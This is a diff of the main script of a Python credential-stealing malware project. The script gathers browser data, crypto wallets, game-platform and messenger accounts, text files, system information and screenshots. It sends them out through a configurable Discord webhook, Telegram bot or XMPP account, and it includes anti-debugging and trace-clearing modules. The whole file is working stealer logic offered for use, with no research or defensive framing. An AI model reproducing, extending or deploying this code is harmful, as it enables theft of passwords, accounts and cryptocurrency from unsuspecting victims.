@@ -1,68 +1,68 @@
 enableFileGrubber = False
+sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
+# You can write your address for sending logs here
+discordData = ["url of your WebHook","name of that WebHook"]
+TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
+xmppData = ["jabberid","jabberpassword","jabberreceiver"]
+
 
 # do not change the value of the variables below
 name = ''
 password = ''
 np = []
+dataForMassageSYS =[]
+dataForMassageBrowsers =[]
+dataForMassageOther =[]
+dataForMassageWallets =[]
+dataForMassageFiles = []
 
 
-from scripts.send import make_folder
+from scripts.manager import make_folder
 from scripts.system import system_info
 from scripts.system import programs
-from scripts.system import screenshoot
-from scripts.browsers import chrome
-from scripts.browsers import opera
-from scripts.another import Minacraft
-from scripts.browsers import firefox
-from scripts.another import telegram
-from scripts.send import send 
-from scripts.removal_of_traces import clear
-from scripts.another import steam
-from scripts.another import discord
-from scripts.another import epicGames
-# from scripts.another import wup
+from scripts.system import photos
+from scripts.games import Minacraft
+from scripts.messengers import telegram
+from scripts.manager import send 
+from scripts.manager import clear
+from scripts.games import steam
+from scripts.messengers import discord
+from scripts.games import epicGames
+from scripts.messengers import whatsapp
+from scripts.games import roblox
 from scripts.wallets import wallets
-from scripts.another import skype
-#from scripts.another import BattleNET
-from scripts.another import Uplay
-from scripts.another import viber
-from scripts.browsers import edge
-from scripts.browsers import brave
-from scripts.browsers import chromeSxs
-from scripts.browsers import torch
-from scripts.browsers import brave
-from scripts.browsers import yandex
-from scripts.system import Files_txt
-from scripts.system import file_grubber
-from scripts.secure import antiDebug
+from scripts.messengers import skype
+from scripts.games import BattleNET
+from scripts.games import Uplay
+from scripts.messengers import viber
+from scripts.browsers.browsers import Browsers
+from scripts.files import Files_txt
+from scripts.files import file_grubber
+from scripts.secure.antiDebug import AntiDebug
 
-
-antiDebug.AntiDebug
-make_folder.makeFolders()
+AntiDebug()
+make_folder.makeFolders(enableFileGrubber)
 if enableFileGrubber:
-    file_grubber.Grab()
-chrome.Chrome()
-edge.Edge()
-yandex.Yandex()
-epicGames.Epic()
-skype.skype()
-Uplay.Ubisoft()
-opera.Opera()
-torch.Torch()
-chromeSxs.Chrome_SxS()
-firefox.Firefox()
-brave.Brave()
-Minacraft.Minecraft()
-steam.Steam()
-wallets.Wallets()
-#BattleNET.BattleNet()
-system_info.SystemInfo()
-Files_txt.TxtSteal()
+    dataForMassageFiles= file_grubber.Grab(dataForMassageFiles)
+Browsers()
+dataForMassageBrowsers = Browsers.Return()
+dataForMassageOther = epicGames.Epic(dataForMassageOther)
+dataForMassageOther = Uplay.Ubisoft(dataForMassageOther)
+dataForMassageOther = Minacraft.Minecraft(dataForMassageOther)
+dataForMassageOther = roblox.roblox(dataForMassageOther)
+dataForMassageOther = steam.Steam(dataForMassageOther)
+dataForMassageOther =BattleNET.BattleNet(dataForMassageOther)
+dataForMassageOther = skype.skype(dataForMassageOther)
+dataForMassageOther = telegram.Telegram(dataForMassageOther)
+dataForMassageOther = viber.Viber(dataForMassageOther)
+dataForMassageOther = discord.Discord(dataForMassageOther)
+dataForMassageOther = whatsapp.WhatsApp(dataForMassageOther)
+dataForMassageWallets = wallets.Wallets(dataForMassageWallets)
+dataForMassageSYS = system_info.SystemInfo(dataForMassageSYS)
+if not enableFileGrubber:
+    Files_txt.TxtSteal()
 programs.Programs()
-telegram.Telegram()
-viber.Viber()
-discord.Discord()
-screenshoot.Screenshot()
+photos.Screenshot()
 
 
 
@@ -73,7 +73,7 @@ try:
 except Exception as e:
     print(e)
 try:
-    send.Send(np)
+    send.Send(sendType,np,dataForMassageSYS,dataForMassageBrowsers,dataForMassageOther,dataForMassageWallets,dataForMassageFiles,discordData,TelegramData,xmppData)
     pass
 except Exception as e:
     print(e)
